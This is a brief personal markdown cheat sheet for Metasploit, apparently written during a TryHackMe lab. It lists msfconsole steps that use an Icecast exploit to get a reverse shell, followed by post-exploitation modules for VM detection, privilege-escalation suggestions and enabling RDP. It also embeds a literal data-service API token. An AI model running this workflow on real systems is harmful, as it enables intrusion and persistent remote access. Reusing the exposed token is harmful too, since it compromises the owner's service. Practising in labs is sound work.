# Metasploit Info

## Connection Information
If needed, manually reconnect to the data service in msfconsole using the command:
'''
db_connect --token 97762d57786fc19fa4a133c12cac2a604033cef6c228e630d84c216d2cbd3852e77144bc3151b6b7 --cert /home/andrew/.msf4/msf-ws-cert.pem --skip-verify https://localhost:5443
'''

## Api Account
The username and password are credentials for the API account:
'''
https://localhost:5443/api/v1/auth/account
'''

## Using msfconsole

'''
search icecast
use <number_for_exploit>
set LHOST <ip addr->tun0 inet>
set RHOSTS <TryHackMeBox IP>
exploit -or- run -j
--> Will end up with a reverse shell
'''

Determines if machine is a VM
'''
run post/windows/gather/checkvm
'''

Creates suggestions of exploits to elevate privledges
'''
run post/multi/recon/local_exploit_suggester
'''

Enables RDP (Remote Desktop Protocol)
'''
run post/windows/manage/enable_rdp
'''